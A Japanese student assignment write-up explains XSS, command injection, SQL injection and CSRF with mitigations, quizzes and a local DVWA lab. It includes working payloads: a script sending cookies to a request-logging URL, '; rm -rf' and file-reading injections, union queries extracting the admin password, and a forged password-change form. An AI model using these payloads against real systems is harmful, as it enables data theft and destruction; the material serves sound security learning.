# WEBサービスの代表的な脆弱性を理解する
## 課題内容
[airtable](https://airtable.com/tblTnXBXFOYJ0J7lZ/viwyi8muFtWUlhNKG/recgJaDpZPuLPEkw2?blocks=hide)

## 課題1(質問)
### 1. 
- **XSS**
  - 脆弱性の仕組み
    ```
    Webサイトに悪意のあるスクリプトを埋め込むことで実現。
    ```
  - 発生しうる被害
    - 標的サイトの変数値やcookieなどからの情報漏洩
    - セッションハイジャック
    - ウェブサイトの改竄（ただし攻撃者が準備したURLからアクセスした場合のみ）
    - 悪意のあるスクリプトによりWebページを改ざんする事でパスワードやクレジットカード番号を入力するフォームをWebページに追加し、ユーザからこれらの情報を盗む（フィッシング 詐欺）
    
    [XSSの被害 | Wikipedia](https://ja.wikipedia.org/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0#XSS%E3%81%AE%E8%A2%AB%E5%AE%B3)
  - 対処法
    - htmlで特別な意味を持つ記号をサニタイジングする (HTMLのフォームへの対処)
      
      例1
      ```html
      サニタイジングしていない場合
      <div>$data</div>
        ↓
      <div><script>悪意のあるスクリプト</script></div>

      ---

      サニタイジングしてる場合
      <div>$data</div>
        ↓
      <div>&lt;script&gt;悪意のあるスクリプト&lt;script&gt;</div>
      ```
      
      例2
      ```html
      サニタイジングしていない場合
      <input type="button" value="$data">
        ↓
      <input type="button" value="" onclick="悪意のあるスクリプト">

      ---
      
      サニタイジングしてる場合
      <input type="button" value="$data">
        ↓
      <input type="button" value="&quot; onclick=&quot;悪意のあるスクリプト&quot;>
      ```
      [XSS への対処法 | とほほのWWW入門](http://www.tohoho-web.com/ex/xss.html)


    - 属性値を引用符で囲う
      ```html
      属性値を引用符で囲わない場合
      <input type="button" value=$data>
      ↓
      <input type="button" value=1 onclick=悪意のあるスクリプト>

      ---

      属性値を引用符で囲う場合
      <input type="button" value="$data">
      ↓
      <input type="button" value="1 onclick=悪意のあるスクリプト">
      ```
      [XSS への対処法 | とほほのWWW入門](http://www.tohoho-web.com/ex/xss.html)


    - CookieにHttpOnly属性をつける (JS から Cookie情報にアクセスできないようにする)
      
      もし`<script>`タグがインジェクトされた場合、RequestBinのようなHTTPリクエストを記録するWebサービスを用いて簡単にcookieを保存されてしまう
      ```html
      <script>window.location='https://requestbinのurl/?'.concat(document.cookie)</script>
      ```
      [【ゆっくり解説】ハッキングの基本 XSSとセッションハイジャック【セキュリティ】 | Youtube](https://www.youtube.com/watch?v=IGWKIRamjs0)
  - メモ
    - DOMベースXSS が少し理解できていない、、
  - 参考文献
    - [Cross-site scripting (クロスサイトスクリプティング) | MDN Web Docs](https://developer.mozilla.org/ja/docs/Glossary/Cross-site_scripting)
    - [クロスサイトスクリプティング | Wikipedia](https://ja.wikipedia.org/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0)
      - 背景や目的まで記載されていてわかりやすかった

- **コマンドインジェクション**
  - 脆弱性の仕組み
    ```
    Webアプリケーションプログラムがシェルコマンド文字列を組み立てて実行している箇所がある場合、そこに外部からデータに紛れさせたコマンド文字列を送り込むことで、コンピュータを不正に操ることができる
    ```
    [コマンド注入攻撃対策 | IPA](https://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/501.html)
  - 発生しうる被害
    - host コンピューターのファイル情報が流出する
    - 悪意のあるスクリプトをダウンロードし実行させられる
  - 対処法
    - うっかりシェルを動かさない
      ```
      シェルを起動してコマンドを解釈させることになるAPIがあることを認識し、できればそれらのAPIを使わないようにする。

      Python ならば
      os.system(), os.popen()

      Ruby ならば
      exec(), system()
      ```
    - 別プログラムの起動を避ける
    - 別プログラムを起動せざるを得ないとき
      - シェルが用いられないAPIを選ぶ
        ```
        JavaではRuntimeクラスのexecメソッドがそれにあたる。
        ```
      - 特殊記号の排除
        ```
        別のプログラムに与えるパラメータに用いる文字種を英数字のみ等安全なものに限定し、検査してから渡す。
        ```
      - 環境変数のリセット
        ```Perl
        別のプログラムを呼び出す際の環境変数領域は呼び出し側プログラムによって初期化したものを与える。

        %ENV = ();
        $ENV{'PATH'} = "/bin:/usr/bin";
        system($command);
        ```
  - 参考文献
    - [コマンド注入攻撃対策 | IPA](https://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/501.html)
    - [CWE-78: OSコマンドインジェクション | JVN](https://jvndb.jvn.jp/ja/cwe/CWE-78.html)
      - JVN(Japan Vulnerability Notes) の略
      - 情報セキュリティ対策に資することを目的とする脆弱性対策情報ポータルサイト。
      - JPCERT コーディネーションセンターと IPA が共同運営
    - [Web サイトのセキュリティ | MDN Web Docs](https://developer.mozilla.org/ja/docs/Learn/Server-side/First_steps/Website_security)
      - MDN なんでもあるなあ、、、

- **SQLインジェクション**
  - 脆弱性の仕組み
    ```
    サーバサイドで SQL 文を動的に生成する際に、ユーザから送り込まれたデータをそのまま SQL 文として実行してしまい、データ破壊、データ漏洩などの被害が生じさせる。
    ```
    [SQLインジェクション | とほほのWWW入門](http://www.tohoho-web.com/ex/security.html#sql-injection)
  - 発生しうる被害
    - データベースに蓄積された非公開情報の閲覧
    - データベースに蓄積された情報の改ざん、消去
    - 認証回避による不正ログイン ??
    - ストアドプロシージャ等を利用したOSコマンドの実行 ??
    
    [安全なウェブサイトの作り方 - 1.1 SQLインジェクション | IPA](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_1.html)
  - 対処法
    - SQL文の組み立ては全てプレースホルダで実装する
    - SQL文の組み立てを文字列連結により行う場合は、エスケープ処理等を行うデータベースエンジンのAPIを用いて、SQL文のリテラルを正しく構成する
    
    [安全なウェブサイトの作り方 - 1.1 SQLインジェクション | IPA](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_1.html)
  - メモ
    - SQLインジェクションの例
      ```sql
      対策未実施
      select * from users where user_name = '$data';
      ↓
      select * from users where user_name = 'Yamada'; delete from users where user_name like '%';

      ---

      対策実施済み
      select * from users where user_name = '$data';
      ↓
      select * from users where user_name = 'Yamada''; delete from users where user_name like ''%'';
      ```
  - 参考文献
    - [SQLインジェクション | Wikipedia](https://ja.wikipedia.org/wiki/SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3)
    - [安全なウェブサイトの作り方 - 1.1 SQLインジェクション | IPA](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_1.html)
    - [SQLインジェクション | とほほのWWW入門](http://www.tohoho-web.com/ex/security.html#sql-injection)
    - [SQLインジェクション | MDN Web Docs](https://developer.mozilla.org/ja/docs/Learn/Server-side/First_steps/Website_security#sql_%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3)

- **CSRF**
  - 脆弱性の仕組み
    ```
    悪意のあるユーザーが他のユーザーの資格情報を使用して、そのユーザーの知らないうちに同意なしでアクションを実行する
    ```
    [クロスサイトリクエストフォージェリ (CSRF) | MDN Web Docs](https://developer.mozilla.org/ja/docs/Learn/Server-side/First_steps/Website_security#%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA_csrf)

  - 発生しうる被害
    - ログイン後の利用者のみが利用可能なサービスの悪用
      ```
      不正な送金、利用者が意図しない商品購入、利用者が意図しない退会処理 等
      ```
    - ログイン後の利用者のみが編集可能な情報の改ざん、新規登録
      ```
      各種設定の不正な変更（管理者画面、パスワード等）、掲示板への不適切な書き込み 等
      ```
  - 対処法
    - 処理を実行するページをPOSTメソッドでアクセスするようにし、その「hiddenパラメータ」に秘密情報が挿入されるよう、前のページを自動生成して、実行ページではその値が正しい場合のみ処理を実行する。
    - 処理を実行する直前のページで再度パスワードの入力を求め、実行ページでは、再度入力されたパスワードが正しい場合のみ処理を実行する。
    - Refererが正しいリンク元かを確認し、正しい場合のみ処理を実行する。
    - CookieにSameSite属性を付与する
      
      [CookieのSameSite属性で「防げるCSRF」と「防げないCSRF」](https://blog.motikan2010.com/entry/2019/02/02/Cookie%E3%81%AESameSite%E5%B1%9E%E6%80%A7%E3%81%A7%E3%80%8C%E9%98%B2%E3%81%92%E3%82%8BCSRF%E3%80%8D%E3%81%A8%E3%80%8C%E9%98%B2%E3%81%92%E3%81%AA%E3%81%84CSRF%E3%80%8D)
    
    [安全なウェブサイトの作り方 - 1.6 CSRF（クロスサイト・リクエスト・フォージェリ） | IPA](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_6.html)
  - メモ
    - CSRFは、攻撃者がCookieに格納されているSessionIDを知らなくても悪意のある攻撃が可能
  - 参考文献
    - [3. CSRF (クロスサイト・リクエスト・フォージェリ) | IPA](https://www.ipa.go.jp/security/vuln/vuln_contents/csrf.html)
    - [安全なウェブサイトの作り方 - 1.6 CSRF（クロスサイト・リクエスト・フォージェリ） | IPA](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_6.html)
    - [https://qiita.com/wanko5296/items/142b5b82485b0196a2da](https://qiita.com/wanko5296/items/142b5b82485b0196a2da)
    - [クロスサイトリクエストフォージェリ (CSRF) | MDN Web Docs](https://developer.mozilla.org/ja/docs/Learn/Server-side/First_steps/Website_security#%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA_csrf)

---

## 課題2 (クイズ)
### クイズ1
Cookie に SameSite 属性を付与することで防ぐことができる脆弱性は XSS と CSRF のどちらか?

（但し、SameSite属性を付与することで脆弱性を完全に防げるわけではない。）
<details><summary>回答</summary><div>
CSRF

[CookieのSameSite属性で「防げるCSRF」と「防げないCSRF」](https://blog.motikan2010.com/entry/2019/02/02/Cookie%E3%81%AESameSite%E5%B1%9E%E6%80%A7%E3%81%A7%E3%80%8C%E9%98%B2%E3%81%92%E3%82%8BCSRF%E3%80%8D%E3%81%A8%E3%80%8C%E9%98%B2%E3%81%92%E3%81%AA%E3%81%84CSRF%E3%80%8D)
</div></details>

### クイズ2
悪意のあるユーザーが他のユーザーの資格情報を知らなくても可能な攻撃手法は XSS と CSRF のどちらか？

<details><summary>回答</summary><div>
CSRF

[クロスサイトリクエストフォージェリ (CSRF) | MDN Web Docs](https://developer.mozilla.org/ja/docs/Learn/Server-side/First_steps/Website_security#%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA_csrf)
> メモ: ここでのトリックは、John がユーザーの cookie (またはアクセス資格情報) にアクセスする必要がないことです。ユーザーのブラウザーはこの情報を保存し、関連するサーバーへのすべてのリクエストに自動的に含めます。
</div></details>

---

## 課題3 (実装)

### 環境準備
```bash
$ docker pull vulnerables/web-dvwa
$ docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

### コマンドインジェクション
- 攻撃
  1. 各レベルの確認
      ``` bash
      ; cat source/low.php

      ---

      {$cmd}
      "; } ?>
      ```

      ``` bash
      ; cat source/medium.php

      ---

       '',
      		';'  => '',
      	);

      	// Remove any of the charactars in the array (blacklist).
      	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

      	// Determine OS and execute the ping command.
      	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
      		// Windows
      		$cmd = shell_exec( 'ping  ' . $target );
      	}
      	else {
      		// *nix
      		$cmd = shell_exec( 'ping  -c 4 ' . $target );
      	}

      	// Feedback for the end user
      	$html .= "
      {$cmd}
      ";
      }

      ?>
      ```

    2. ファイルの削除
        ```bash
        ; rm -rf index.php
        ```

        出力結果がエラーとなった
        ```
        Not Found
        The requested URL /vulnerabilities/exec/ was not found on this server.

        Apache/2.4.25 (Debian) Server at localhost Port 80
        ```
- 防御手段
  ```
  特定文字のみ受け付けるようにする

  pingの実行コマンドをshell_exec()で組み立てる
  ```

### SQL インジェクション
- 攻撃
  1. 各テーブルのカラム確認 (passwordカラムの確認)
      ```sql
      ' union select table_name,column_name from information_schema.columns where table_schema = 'dvwa'#
      ```
  2. adminのパスワード取得
  ```sql
  ' union select user, password from dvwa.users where user = 'admin' #
  ```
  3. ハッシュをデコード
- 防御手段
  ```
  フロントエンドの入力フォームにValidationを導入する。

  バックエンドのエンドポイントにValidationを導入する。

  バックエンドのSQLコマンドを組み立て箇所でプレースホルダーを使用する。
  ```

### CSRF
- 攻撃
  1. ダミーサイトを作成
      ```html
      <form action="http://localhost/vulnerabilities/csrf?" method="GET">
        New password:<br />
        <input type="hidden" name="password_new" value="12345"><br />
        Confirm new password:<br />
        <input type="hidden" name="password_conf" value="12345"><br />
        <br />
        <input type="submit" value="Change" name="Change">
      </form>
      ```
  2. ダミーサイトへアクセスしてボタンクリック
- 防御手段
  ```
  csrf の token を form に含める

  cookie属性にSameSite=Laxを付与する
  ```

- 参考記事
  - [DVWAでCSRF](https://qiita.com/KPenguin/items/92e88dfe6a5734dc2532)

### XSS
- 攻撃
  1. cookieを表示
      ```
      ><script>window.alert(document.cookie)</script>

      ---

      PHPSESSID=s391ihbvkbm74il0ghcgjkbvb4; security=low
      ```
- 防御手段
  ```
  エスケープ処理
  ```